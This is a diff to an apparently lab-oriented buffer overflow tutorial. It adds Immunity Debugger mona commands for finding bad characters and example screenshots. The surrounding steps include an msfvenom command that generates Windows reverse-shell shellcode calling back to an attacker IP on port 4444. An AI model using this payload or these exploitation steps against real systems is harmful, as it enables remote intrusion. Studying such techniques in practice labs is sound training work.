@@ -114,6 +114,13 @@ The focus of this section is identifying bad characters so you can ensure they d
 4. Relaunch Immunity and the executable, attaching to the program as you did in previous steps.
 5. Run the script
 **Command: python badcharizard.py**
+
+New Automation: 
+  Go to Immunity, enter in the below command.
+    !mona bytearray
+    !mona compare -f bytearray.bin -a <ESP Mem Address/Value>
+![image](https://user-images.githubusercontent.com/17016378/128985821-4903fbb3-d7b7-4151-8253-29bc22b8d6df.png)
+
 6. Go to Immunity, right-click on the ESP value, and click on "Follow in Dump."
 7. Right-click on the Hex Dump tab and click "Appearance -> Font -> OEM" this will make the values a little bigger for comparison.
 8. In the Hex Dump, 01 represents the first bad character tested while FF represents the last. The bad characters go in order, compare the Hex Dump with the characters you copied into Notepad.
@@ -154,6 +161,9 @@ The last step in this process, generating Shellcode and ensuring that we can exp
 1. Restart Immunity/your exe program and get setup.
 2. Generate the Payload: 
 Command: msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.82 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+Example: 
+![image](https://user-images.githubusercontent.com/17016378/128985928-683b8556-2a94-455f-9499-5925429923c0.png)
+
 3. Replace the LHOST with your Kali Machine IP and replace the -b switch with the bad characters that you had identified earlier. In this instance, there's only one bad character represented by "\x00"
 4. Edit the included gotem.py script. Ensure that your exploitation IP and Port and command values are correct. Take your generated Shellcode and replace the overflow value that is currently in the script.
 5. Ensure that all variables are correct, including your exact byte value, pointer value, etc. 
